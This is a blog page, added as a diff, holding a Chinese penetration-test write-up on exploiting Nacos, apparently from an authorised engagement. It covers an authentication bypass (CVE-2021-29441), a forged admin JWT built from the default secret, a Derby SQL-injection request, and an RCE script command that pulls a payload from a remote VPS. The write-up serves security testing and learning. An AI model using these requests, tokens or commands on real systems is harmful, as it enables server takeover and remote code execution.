@@ -1,0 +1,747 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="rgba(71, 46, 98, 0.8)">
+  <meta name="author" content="kyrie711-wq">
+  <meta name="keywords" content="博客,技术,笔记">
+  
+    <meta name="description" content="实战攻防记录2-Nacos漏洞利用前言在对一家能源供应商的资产进行渗透测试时发现nacos指纹，后面通过nday打进系统，第一次在实战中碰到这个洞，那就专门学习和记录一下。 介绍Nacos（Naming and Configuration Service）是阿里巴巴开源的动态服务发现、配置管理和服务治理平台，支持微服务架构中的服务注册与发现、统一配置中心及实时配置更新，具备高可用、多环境隔离、多语">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实战攻防记录2-Nacos漏洞利用">
+<meta property="og:url" content="https://kyrie711-wq.github.io/2026/02/12/%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B22-Nacos%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="snowhy的博客">
+<meta property="og:description" content="实战攻防记录2-Nacos漏洞利用前言在对一家能源供应商的资产进行渗透测试时发现nacos指纹，后面通过nday打进系统，第一次在实战中碰到这个洞，那就专门学习和记录一下。 介绍Nacos（Naming and Configuration Service）是阿里巴巴开源的动态服务发现、配置管理和服务治理平台，支持微服务架构中的服务注册与发现、统一配置中心及实时配置更新，具备高可用、多环境隔离、多语">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kyrie711-wq.github.io/img/image-20260212150048868.png">
+<meta property="article:published_time" content="2026-02-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-02-22T05:30:40.783Z">
+<meta property="article:author" content="kyrie711-wq">
+<meta property="article:tag" content="漏洞利用">
+<meta property="article:tag" content="Nacos">
+<meta property="article:tag" content="实战攻防">
+<meta property="article:tag" content="CVE-2021-29441">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://kyrie711-wq.github.io/img/image-20260212150048868.png">
+  
+  
+  
+  <title>实战攻防记录2-Nacos漏洞利用 - snowhy的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"kyrie711-wq.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>snowhy的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE/" target="_self">
+                <i class="iconfont icon-app"></i>
+                <span>安全项目</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" target="_self">
+                <i class="iconfont icon-bug-fill"></i>
+                <span>漏洞挖掘</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/CTF%E7%AB%9E%E8%B5%9B/" target="_self">
+                <i class="iconfont icon-flag-fill"></i>
+                <span>CTF竞赛</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/Web%E6%B8%97%E9%80%8F/" target="_self">
+                <i class="iconfont icon-windows-fill"></i>
+                <span>Web渗透</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/vdysjx.webp') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="实战攻防记录2-Nacos漏洞利用"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-02-12 00:00" pubdate>
+          February 12, 2026 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.8k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          15 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">实战攻防记录2-Nacos漏洞利用</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="实战攻防记录2-Nacos漏洞利用"><a href="#实战攻防记录2-Nacos漏洞利用" class="headerlink" title="实战攻防记录2-Nacos漏洞利用"></a>实战攻防记录2-Nacos漏洞利用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在对一家能源供应商的资产进行渗透测试时发现nacos指纹，后面通过nday打进系统，第一次在实战中碰到这个洞，那就专门学习和记录一下。</p>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Nacos（Naming and Configuration Service）是阿里巴巴开源的动态服务发现、配置管理和服务治理平台，支持微服务架构中的服务注册与发现、统一配置中心及实时配置更新，具备高可用、多环境隔离、多语言支持和丰富的生态集成能力（如 Spring Cloud Alibaba、Dubbo 等），提供 Web 控制台和集群部署方案，适用于云原生应用，已成为 CNCF 孵化项目，是构建现代分布式系统的重要基础设施。</p>
+<h3 id="Nacos-开放的端口"><a href="#Nacos-开放的端口" class="headerlink" title="Nacos 开放的端口"></a>Nacos 开放的端口</h3><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gml">Nacos部署需要开放以下端口以确保其正常运行：<br><br>主端口（HTTP端口）：默认为<span class="hljs-number">8848</span>，用于客户端、控制台及OpenAPI的HTTP通信。这个端口是访问Nacos管理界面的主要入口。<br><br>客户端gRPC请求服务端端口：默认为<span class="hljs-number">9848</span>，用于客户端向服务端发起gRPC连接和请求。Nacos <span class="hljs-number">2.</span><span class="hljs-variable language_">x</span>版本默认使用了gRPC通信方式，这会增加<span class="hljs-number">9848</span>（客户端gRPC请求服务端端口）和<span class="hljs-number">9849</span>（服务端gRPC请求服务端端口）两个端口。<br><br>服务端gRPC请求服务端端口：默认为<span class="hljs-number">9849</span>，用于服务间的数据同步和其他服务端之间的通信。<br><br>Jraft请求服务端端口：默认为<span class="hljs-number">7848</span>，用于处理服务端间的Raft相关请求，比如集群管理中的选主和日志复制等。<br></code></pre></td></tr></table></figure>
+
+<h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>fofa: <code>app=&quot;NACOS&quot;</code></p>
+<p>我在实际项目中通过目录扫描发现的，因为目标系统未将nacos部署在8848而是直接443端口下，所以一些指纹识别工具并没发现</p>
+<p><img src="/img/image-20260212150048868.png" srcset="/img/loading.gif" lazyload alt="Nacos指纹识别"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="工具打法"><a href="#工具打法" class="headerlink" title="工具打法"></a>工具打法</h3><p>在识别出指纹后直接找个漏洞工具进行利用</p>
+<p><img src="/img/image-20260212150427155.png" srcset="/img/loading.gif" lazyload alt="漏洞扫描结果"></p>
+<p>发现是存在很多漏洞的</p>
+<p>然后直接利用工具写入新的账号密码</p>
+<p><img src="/img/image-20260212150607330.png" srcset="/img/loading.gif" lazyload alt="创建新用户"></p>
+<p>最后成功登录</p>
+<p><img src="/img/image-20260212150628418.png" srcset="/img/loading.gif" lazyload alt="成功登录"></p>
+<h3 id="复现研究"><a href="#复现研究" class="headerlink" title="复现研究"></a>复现研究</h3><p>nacos本身是具有很多漏洞的，难得遇到真实的环境，可以尝试在实战项目中把检测到的漏洞都自己打一遍</p>
+<h4 id="Nacos-Default-Auth-Disabled-认证绕过-（CVE-2021-29441）"><a href="#Nacos-Default-Auth-Disabled-认证绕过-（CVE-2021-29441）" class="headerlink" title="Nacos Default Auth Disabled (认证绕过) （CVE-2021-29441）"></a>Nacos Default Auth Disabled (认证绕过) （CVE-2021-29441）</h4><p><strong>CVE-2021-29441</strong> 是 Nacos 的一个<strong>未授权访问漏洞</strong>，其原理是：在 <strong>Nacos 1.2.0 至 1.4.1 版本</strong>中，即使启用了认证，系统仍会因硬编码的 <code>User-Agent: Nacos-Server</code> 判断逻辑，<strong>绕过身份验证</strong>，允许攻击者直接访问 <code>/nacos/v1/auth/users</code> 等敏感接口，从而<strong>读取或创建用户、获取配置信息</strong>，甚至接管服务。</p>
+<p>✅ <strong>影响版本</strong>：Nacos ≤ 1.4.1（主要为 1.x 系列）<br>✅ <strong>修复建议</strong>：升级至 1.4.2 或更高版本，并确保开启 <code>nacos.core.auth.enabled=true</code>。</p>
+<p><strong>未授权查看账号密码</strong></p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-keyword">/nacos/</span>v1<span class="hljs-keyword">/auth/</span>users?pageNo=<span class="hljs-number">1</span><span class="hljs-variable">&amp;</span>pageS<span class="hljs-attr">ize</span><span class="hljs-operator">=</span><span class="hljs-number">9</span><span class="hljs-variable">&amp;search</span>=accurate<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20260212152309038.png" srcset="/img/loading.gif" lazyload alt="未授权查看用户"></p>
+<p><strong>未授权创建用户</strong></p>
+<p><img src="/img/image-20260212152634786.png" srcset="/img/loading.gif" lazyload alt="创建用户1"></p>
+<p><img src="/img/image-20260212152722592.png" srcset="/img/loading.gif" lazyload alt="创建用户2"></p>
+<p><strong>未授权删除用户</strong></p>
+<p><img src="/img/image-20260212153050647.png" srcset="/img/loading.gif" lazyload alt="删除用户"></p>
+<h4 id="默认jwt密钥-未授权访问"><a href="#默认jwt密钥-未授权访问" class="headerlink" title="默认jwt密钥-未授权访问"></a>默认jwt密钥-未授权访问</h4><p>Nacos 使用硬编码的默认 JWT 密钥（<code>SecretKey0123456789...</code>），若未手动修改，攻击者可利用该密钥伪造任意用户（包括管理员）的合法身份令牌，在开启认证的情况下仍能绕过权限校验，实现未授权访问、创建用户、读取或篡改敏感配置，从而接管整个 Nacos 服务。</p>
+<p><strong>影响版本</strong>：0.1.0&lt;&#x3D;nacos&lt;&#x3D;2.2.0</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">nacos.core.auth.default.token.secret.key</span>=SecretKey012345678901234567890123456789012345678901234567890123456789 <span class="hljs-comment"># =后边的是默认的硬编码</span><br></code></pre></td></tr></table></figure>
+
+<p>漏洞利用不妨先用自己创建的用户test来看看这个accesstoken是怎么生成的</p>
+<p><img src="/img/image-20260212155004014.png" srcset="/img/loading.gif" lazyload alt="查看token生成"></p>
+<p>将登录后的token进行jwt解密</p>
+<p><img src="/img/image-20260212155555350.png" srcset="/img/loading.gif" lazyload alt="JWT解密"></p>
+<p>发现只需要用户名和时间戳和默认key即可</p>
+<p>因为nacos存在默认用户nacos，那么可以借此伪造token</p>
+<p><img src="/img/image-20260212155935347.png" srcset="/img/loading.gif" lazyload alt="伪造token"></p>
+<p>点击登录用户名和密码可以随便填写，在login接口的header添加下列参数</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Authorization:</span> Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc3MDkwMDU3NX0.vO04W-FqDkgkII28fVEayfZEiLW0mtVtPZSA8U7gcOY<br></code></pre></td></tr></table></figure>
+
+<p>成功接管</p>
+<p><img src="/img/image-20260212160550385.png" srcset="/img/loading.gif" lazyload alt="成功接管"></p>
+<p>由于实际环境限制，只能打到这里，nacos还有几个RCE只能搭建漏洞环境复现了。</p>
+<h4 id="Nacos-Hessian-反序列化-RCE"><a href="#Nacos-Hessian-反序列化-RCE" class="headerlink" title="Nacos Hessian 反序列化 RCE"></a>Nacos Hessian 反序列化 RCE</h4><p>Nacos Hessian反序列化漏洞主要影响7848端口的Jraft服务，该端口用于处理集群模式下Raft协议的通信，由于服务在处理部分Jraft请求时使用Hessian传输协议进行反序列化且过滤不严，导致攻击者可构造恶意数据包实现远程代码执行（RCE）；在版本差异方面，Nacos 1.x在单机模式下默认不开放7848端口因此不受影响，但集群模式下仍会开放该端口而存在风险，Nacos 2.x则无论单机还是集群模式均默认开放7848端口，受影响范围更广；此外，当使用Docker部署时若未将7848端口映射到宿主机外部，该端口仅容器内部可访问，此时也不受此漏洞影响。</p>
+<p><strong>影响版本</strong>：1.4.0&lt;&#x3D;Nacos&lt;1.4.6, 2.0.0&lt;Nacos&lt;2.2.3</p>
+<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p><strong>3.X版本</strong></p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos">https://github.com/alibaba/nacos</a></p>
+<p>环境要求（经本地验证）：</p>
+<ul>
+<li>Nacos 版本：3.2.0-SNAPSHOT</li>
+<li>JDK 版本：OpenJDK 17.0.18</li>
+<li>Maven 版本：3.9.9</li>
+</ul>
+<p><strong>checkstyle 插件 JDK 版本不兼容</strong></p>
+<p>建议将maven的启动环境配置java17</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> JAVA_HOME=C:\path\to\jdk-17<br><span class="hljs-built_in">set</span> PATH=%JAVA_HOME%\bin;%PATH%<br></code></pre></td></tr></table></figure>
+
+<p><strong>编译时跳过一切检查</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mvn -Prelease-nacos -Dmaven.test.skip=<span class="hljs-literal">true</span> -Dcheckstyle.skip=<span class="hljs-literal">true</span> -Drat.skip=<span class="hljs-literal">true</span> -Djacoco.skip=<span class="hljs-literal">true</span> clean install -U<br></code></pre></td></tr></table></figure>
+
+<p><strong>JWT Token 密钥配置需要配置32字节</strong></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java.lang.IllegalArgumentException: </span>the length of secret key must great than <span class="hljs-keyword">or </span>equal <span class="hljs-number">32</span> <span class="hljs-keyword">bytes</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">And </span>the secret key must <span class="hljs-keyword">be </span>encoded <span class="hljs-keyword">by </span><span class="hljs-keyword">base64</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>Tomcat 配置</strong>server.tomcat.max-http-form-post-size</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># Tomcat 配置（Nacos 3.x 必需）</span><br>server.tomcat.<span class="hljs-built_in">max</span>-<span class="hljs-keyword">http</span>-form-<span class="hljs-built_in">post</span>-size=<span class="hljs-number">10485760</span><br>server.tomcat.<span class="hljs-built_in">max</span>-<span class="hljs-keyword">http</span>-<span class="hljs-built_in">post</span>-size=<span class="hljs-number">10485760</span><br></code></pre></td></tr></table></figure>
+
+<p>最后成功搭建</p>
+<p><img src="/img/image-20260219155321943.png" srcset="/img/loading.gif" lazyload alt="环境搭建成功"></p>
+<p><strong>2.X版本（漏洞版本）</strong></p>
+<p>直接下载这个项目：<a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/releases/tag/2.1.1">https://github.com/alibaba/nacos/releases/tag/2.1.1</a></p>
+<p>运行以下命令即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">startup.cmd -m standalone<br></code></pre></td></tr></table></figure>
+
+<h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>不出网环境可以直接打内存马</p>
+<p><img src="/img/image-20260219163730861.png" srcset="/img/loading.gif" lazyload alt="内存马利用"></p>
+<h4 id="Nacos-Derby-sql-注入"><a href="#Nacos-Derby-sql-注入" class="headerlink" title="Nacos Derby sql 注入"></a>Nacos Derby sql 注入</h4><p>Nacos 是一款动态服务发现和配置管理平台，默认在 <strong>standalone 模式</strong>下使用内置的 Derby 数据库（轻量级嵌入式数据库）。其运维接口 <code>/nacos/v1/cs/ops/derby</code> 和 <code>/nacos/v1/cs/ops/data/removal</code> 用于执行 Derby 数据库的 SQL 操作，但存在未授权访问和 SQL 注入风险。</p>
+<p><strong>影响版本</strong>：&lt;2.4.0</p>
+<p><strong>基础poc</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /nacos/v1/cs/ops/derby?sql=%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">75</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">73</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: &#123;&#123;target&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20260221220648743.png" srcset="/img/loading.gif" lazyload alt="SQL注入利用"></p>
+<h4 id="Nacos-基于Derby-SQL注入漏洞的RCE"><a href="#Nacos-基于Derby-SQL注入漏洞的RCE" class="headerlink" title="Nacos 基于Derby SQL注入漏洞的RCE"></a>Nacos 基于Derby SQL注入漏洞的RCE</h4><p>Nacos Derby数据库接口<code>/nacos/v1/cs/ops/derby</code> 和 <code>/nacos/v1/cs/ops/data/removal</code> 存在条件竞争漏洞，攻击者可借此接口执行恶意SQL，加载恶意jar并注册函数，在未授权条件下利用 derby sql 注入漏洞（CVE-2021-29442）调用恶意函数来执行恶意代码。</p>
+<p><strong>影响版本</strong>：&lt;2.4.0</p>
+<h5 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>poc下载：<a target="_blank" rel="noopener" href="https://github.com/FFR66/Nacos_Rce">https://github.com/FFR66/Nacos_Rce</a></p>
+<p>先vps起一个service.py用于启动文件服务</p>
+<p><img src="/img/image-20260221224456835.png" srcset="/img/loading.gif" lazyload alt="启动文件服务"></p>
+<p>然后在本机起一个Nacos_Rce.py用于进行连续的SQL注入，爆破上传生成的临时文件名，进行命令执行。-u 后面接目标端口和ip，-c 后面接要执行的命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python Nacos_Rce.py -t 47.96.99.165 -p 5000 -u http://localhost:8848/nacos/#/login -c <span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure>
+
+<p>当系统为未授权访问时，可直接触发RCE。</p>
+<p><img src="/img/image-20260221224650462.png" srcset="/img/loading.gif" lazyload alt="RCE成功"></p>
+<p>成功实现RCE</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" class="category-chain-item">漏洞挖掘</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="print-no-link">#漏洞利用</a>
+      
+        <a href="/tags/Nacos/" class="print-no-link">#Nacos</a>
+      
+        <a href="/tags/%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/" class="print-no-link">#实战攻防</a>
+      
+        <a href="/tags/CVE-2021-29441/" class="print-no-link">#CVE-2021-29441</a>
+      
+        <a href="/tags/RCE/" class="print-no-link">#RCE</a>
+      
+        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" class="print-no-link">#SQL注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/01/05/debug%E6%A8%A1%E5%BC%8F%E5%BC%80%E5%90%AF%E6%83%85%E6%99%AF%E4%B8%8B%E7%9A%84%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/" title="debug模式开启情景下的渗透思路">
+                        <span class="hidden-mobile">debug模式开启情景下的渗透思路</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
